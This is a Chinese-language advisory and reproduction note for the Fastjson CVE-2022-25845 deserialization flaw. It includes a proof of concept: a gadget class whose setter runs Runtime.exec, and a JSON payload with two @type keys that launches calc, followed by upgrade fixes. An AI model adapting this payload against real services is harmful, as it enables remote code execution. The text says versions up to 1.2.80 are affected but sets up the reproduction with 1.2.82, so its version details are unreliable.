# Fastjson 远程代码执行漏洞 CVE-2022-25845

## 漏洞描述

Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列 化到 JavaBean。在 Fastjson 1.2.80 及以下版本中存在反序列化漏洞，攻击者可 以在特定依赖下利用此漏洞绕过默认 autoType 关闭限制，从而反序列化有安全风险的类。

## 漏洞影响

```
Fastjson ≤ 1.2.80
```

## 漏洞复现

利用 idea 创建 maven 项目 搭建漏洞环境，在 pom 文件中添加

```
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.82</version>
</dependency> 
```

创建文件夹 com.example.fastjson，在下面添加两个 java 文件

```
package com.example.fastjson;
 
import java.io.IOException;
 
public class Poc extends Exception {
    public void setName(String str) {
        try {
            Runtime.getRuntime().exec(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
package com.example.fastjson;
import com.alibaba.fastjson.JSON;
 
public class PocDemo {
    public static void main(String[] args) {
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.example.fastjson.Poc\",\"name\":\"calc\"}";
        JSON.parse(json);
    }
}
```

运行 PocDemo

## 漏洞修复

1. 升级至版本 FastJson 1.2.83：https://github.com/alibaba/fastjson/releases/tag/1.2.83
2. 升级到 FastJosn v2：https://github.com/alibaba/fastjson2/releases
